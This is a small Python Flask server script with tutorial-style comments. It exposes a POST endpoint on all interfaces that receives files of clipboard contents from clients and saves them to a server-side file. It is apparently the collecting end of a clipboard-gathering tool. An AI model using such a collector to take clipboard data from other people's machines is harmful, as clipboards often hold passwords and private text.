from flask import Flask, request

app = Flask(__name__) #creates an instance of this

#Sets up the routing so that when someone navigates to the local host with the correct port /output this is triggered
#Also is specified to take in post requests
"""
get_output receives the post request from the client and proccesses the data in that file. It adds the data in that file
to a file on the server so then the server has a copy of all the clipboard_data
"""
@app.route("/output", methods=["POST"])
def get_output():

    #files is a dictionary and the file is stored under the key file. We get the file using get
    clipboard_info_file = request.files.get('file')

    #Opens a file on the server side and sets it to write mode. If the file does not exist then write will create the
    #file in write mode
    server_clipboard_file = open("server_stored_clipboard_info", "w")

    #goes through every line in the file received from the client
    for line in clipboard_info_file:
        #decodes each line since it is in binary, and then writes it to the server_clipboard_file
        s = line.decode()
        server_clipboard_file.write(s)

    #post returns something so we return thanks
    return "thanks"

def main():
    #Starts a server on the local host on port 12345
    app.run(host="0.0.0.0", port=12345)

main()